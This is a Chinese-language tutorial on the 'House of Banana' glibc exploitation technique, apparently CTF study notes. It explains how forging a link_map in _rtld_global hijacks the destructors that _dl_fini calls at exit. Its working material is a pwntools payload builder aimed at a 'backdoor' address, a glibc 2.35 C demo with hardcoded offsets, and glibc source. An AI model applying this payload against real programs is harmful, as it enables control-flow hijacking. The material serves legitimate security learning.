- [House of Banana](#house-of-banana)
  - [原理](#原理)
  - [步骤](#步骤)
  - [注意](#注意)
  - [伪造fake\_link\_map](#伪造fake_link_map)
  - [示例](#示例)
  - [源码](#源码)

# House of Banana

## 原理

通过伪造`_rtld_global`中的`link_map`指针，劫持`link_map`的函数列表，在`exit`时调用`_dl_fini`触发漏洞

## 步骤

1. 泄露libc地址
2. 查看`_rtld_global._dl_ns[0]._ns_nloaded`值是否为`4`，若不是则需要修改`link_map`链表的个数，或修改`_rtld_global._dl_ns[0]._ns_nloaded`
3. [伪造fake\_link\_map](#伪造fake_link_map)
4. 修改`_rtld_global._dl_ns[0]._ns_loaded`指向`fake_link_map`
5. 退出或者`exit`时调用`_dl_fini`函数即可触发漏洞

## 注意

如果开启了 `ASLR` 保护需要爆破

## 伪造fake_link_map

```python
from pwn import *

def HOB(call_addr, fake_link_map_addr, _ns_nloaded = 4):
    payload = b''
    # 伪造link_map链表
    for i in range(_ns_nloaded):
        payload = payload.ljust(0x28 * i + 0x18, b'\x00') + p64(fake_link_map_addr + 0x28 * (i + 1))# l_next
        payload = payload.ljust(0x28 * i + 0x28, b'\x00') + p64(fake_link_map_addr + 0x28 * i)      # l_real
    payload = payload.ljust(0x110, b'\x00')
    # 调用函数列表指针
    payload += p64(fake_link_map_addr + 0x110) + p64(fake_link_map_addr + 0x130)
    # 调用函数的个数
    payload += p64(fake_link_map_addr + 0x120) + p64(8 * len(call_addr))
    # 调用函数列表
    for func in call_addr[::-1]:
        payload += p64(func)
    # 进入if
    payload = payload.ljust(0x318, b'\x00') + p64(0x800000000)
    return payload

if __name__ == "__main__":
    p = process('./pwn')
    heap_addr   = int(p.recv(14), 16)
    fun1        = int(p.recv(14), 16)
    fun2        = int(p.recv(14), 16)
    fun3        = int(p.recv(14), 16)
    backdoor    = int(p.recv(14), 16)
    p.send(HOB([fun1, fun2, fun3, backdoor], heap_addr))
    p.interactive()
```

## 示例

```C
/**
 * 关闭ASLR  : sudo sysctl -w kernel.randomize_va_space=0
 * glibc版本 : glibc-2.35
 */
#include <stdio.h>
#include <stdlib.h>
#include <link.h>

#define SET_PTR SET_PTR64
#define SET_PTR64(ptr, offset, value) \
    *(size_t *)(((char *)(ptr)) + (offset)) = (size_t)(value)

void fun1()
{
    printf("第1个被调用的地址\n");
}
void fun2()
{
    printf("第2个被调用的地址\n");
}
void fun3()
{
    printf("第3个被调用的地址\n");
}

int main()
{
    struct link_map *map;
    /* 过去glibc基地址 */
    size_t libc_base = (size_t)(&puts - 0x80e50);
    size_t *_rtld_global = (size_t *)(libc_base + 0x3fd040);

    /* 伪造fake_link_map */
    char *ptr = malloc(0x1000);

    // 设置链表长度，需要_rtld_global._dl_ns[0]._ns_nloaded个link_map，这里为4
    SET_PTR(ptr + 0x28 * 0, 0x18, ptr + 0x28 * 1); // 设置l_next指向下一个link_map
    SET_PTR(ptr + 0x28 * 0, 0x28, ptr + 0x28 * 0); // 设置l_addr指向自己

    SET_PTR(ptr + 0x28 * 1, 0x18, ptr + 0x28 * 2); // 设置l_next指向下一个link_map
    SET_PTR(ptr + 0x28 * 1, 0x28, ptr + 0x28 * 1); // 设置l_addr指向自己

    SET_PTR(ptr + 0x28 * 2, 0x18, ptr + 0x28 * 3); // 设置l_next指向下一个link_map
    SET_PTR(ptr + 0x28 * 2, 0x28, ptr + 0x28 * 2); // 设置l_addr指向自己

    SET_PTR(ptr + 0x28 * 3, 0x18, NULL);           // 设置l_next指向下一个link_map
    SET_PTR(ptr + 0x28 * 3, 0x28, ptr + 0x28 * 3); // 设置l_addr指向自己

    // 进入if
    SET_PTR(ptr, 0x318, 0x800000000);

    // 设置调用函数列表指针
    SET_PTR(ptr, 0x110, ptr + 0x110); // l->l_info[DT_FINI_ARRAY] 指向 Elf64_Dyn
    SET_PTR(ptr, 0x110 + 8, 0);       // Elf64_Dyn.d_un.d_ptr = 0
    SET_PTR(ptr, 0, ptr + 0x200);     // l->l_addr = 函数列表地址

    // 注意:函数列表值的计算方式:l->l_addr + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr
    // 这里将l->l_addr设置为函数列表地址，l->l_info[DT_FINI_ARRAY]->d_un.d_ptr = 0，反之亦然

    // 调用函数的个数
    SET_PTR(ptr, 0x120, ptr + 0x120); // l->l_info[DT_FINI_ARRAYSZ] 指向 Elf64_Dyn
    SET_PTR(ptr, 0x120 + 8, 8 * 3);   // Elf64_Dyn.d_un.d_val，3表示函数列表有三个函数, 注意这里是8的倍数，且从后往前调用

    // 函数列表个数的计算方式:l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof(ElfW(Addr))
    // 64位下sizeof(ElfW(Addr)) = 8

    // 设置函数列表，地址任意
    SET_PTR(ptr, 0x200 + 8 * 0, &fun3); // listFun
    SET_PTR(ptr, 0x200 + 8 * 1, &fun2); // listFun
    SET_PTR(ptr, 0x200 + 8 * 2, &fun1); // listFun

    /* 设置_ns_loaded指向fake_link_map */
    SET_PTR(_rtld_global, 0, ptr);

    return 0;
}
```

## 源码

```C
void _dl_fini(void)
{
    /* Lots of fun ahead.  We have to call the destructors for all still
       loaded objects, in all namespaces.  The problem is that the ELF
       specification now demands that dependencies between the modules
       are taken into account.  I.e., the destructor for a module is
       called before the ones for any of its dependencies.

       To make things more complicated, we cannot simply use the reverse
       order of the constructors.  Since the user might have loaded objects
       using `dlopen' there are possibly several other modules with its
       dependencies to be taken into account.  Therefore we have to start
       determining the order of the modules once again from the beginning.  */

    /* We run the destructors of the main namespaces last.  As for the
       other namespaces, we pick run the destructors in them in reverse
       order of the namespace ID.  */
#ifdef SHARED
    int do_audit = 0;
again:
#endif
    for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
        /* Protect against concurrent loads and unloads.  */
        __rtld_lock_lock_recursive(GL(dl_load_lock));

        unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
        /* No need to do anything for empty namespaces or those used for
       auditing DSOs.  */
        if (nloaded == 0
#ifdef SHARED
            || GL(dl_ns)[ns]._ns_loaded->l_auditing != do_audit
#endif
        )
            __rtld_lock_unlock_recursive(GL(dl_load_lock));
        else
        {
#ifdef SHARED
            _dl_audit_activity_nsid(ns, LA_ACT_DELETE);
#endif

            /* Now we can allocate an array to hold all the pointers and
               copy the pointers in.  */
            struct link_map *maps[nloaded];

            unsigned int i;
            struct link_map *l;
            assert(nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);
            for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l->l_next)
                /* Do not handle ld.so in secondary namespaces.  */
                if (l == l->l_real)
                {
                    assert(i < nloaded);

                    maps[i] = l;
                    l->l_idx = i;
                    ++i;

                    /* Bump l_direct_opencount of all objects so that they
                       are not dlclose()ed from underneath us.  */
                    ++l->l_direct_opencount;
                }
            assert(ns != LM_ID_BASE || i == nloaded);
            assert(ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);
            unsigned int nmaps = i;

            /* Now we have to do the sorting.  We can skip looking for the
               binary itself which is at the front of the search list for
               the main namespace.  */
            _dl_sort_maps(maps, nmaps, (ns == LM_ID_BASE), true);

            /* We do not rely on the linked list of loaded object anymore
               from this point on.  We have our own list here (maps).  The
               various members of this list cannot vanish since the open
               count is too high and will be decremented in this loop.  So
               we release the lock so that some code which might be called
               from a destructor can directly or indirectly access the
               lock.  */
            __rtld_lock_unlock_recursive(GL(dl_load_lock));

            /* 'maps' now contains the objects in the right order.  Now
               call the destructors.  We have to process this array from
               the front.  */
            for (i = 0; i < nmaps; ++i)
            {
                struct link_map *l = maps[i];

                if (l->l_init_called)
                {
                    /* Make sure nothing happens if we are called twice.  */
                    l->l_init_called = 0;

                    /* Is there a destructor function?  */
                    if (l->l_info[DT_FINI_ARRAY] != NULL || (ELF_INITFINI && l->l_info[DT_FINI] != NULL))
                    {
                        /* When debugging print a message first.  */
                        if (__builtin_expect(GLRO(dl_debug_mask) & DL_DEBUG_IMPCALLS, 0))
                            _dl_debug_printf("\ncalling fini: %s [%lu]\n\n",
                                             DSO_FILENAME(l->l_name),
                                             ns);

                        /* First see whether an array is given.  */
                        if (l->l_info[DT_FINI_ARRAY] != NULL)
                        {
                            ElfW(Addr) *array =
                                (ElfW(Addr) *)(l->l_addr + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
                            unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof(ElfW(Addr)));
                            while (i-- > 0)
                                ((fini_t)array[i])();
                        }

                        /* Next try the old-style destructor.  */
                        if (ELF_INITFINI && l->l_info[DT_FINI] != NULL)
                            DL_CALL_DT_FINI(l, l->l_addr + l->l_info[DT_FINI]->d_un.d_ptr);
                    }

#ifdef SHARED
                    /* Auditing checkpoint: another object closed.  */
                    _dl_audit_objclose(l);
#endif
                }

                /* Correct the previous increment.  */
                --l->l_direct_opencount;
            }

#ifdef SHARED
            _dl_audit_activity_nsid(ns, LA_ACT_CONSISTENT);
#endif
        }
    }

#ifdef SHARED
    if (!do_audit && GLRO(dl_naudit) > 0)
    {
        do_audit = 1;
        goto again;
    }

    if (__glibc_unlikely(GLRO(dl_debug_mask) & DL_DEBUG_STATISTICS))
        _dl_debug_printf("\nruntime linker statistics:\n"
                         "           final number of relocations: %lu\n"
                         "final number of relocations from cache: %lu\n",
                         GL(dl_num_relocations),
                         GL(dl_num_cache_relocations));
#endif
}
```
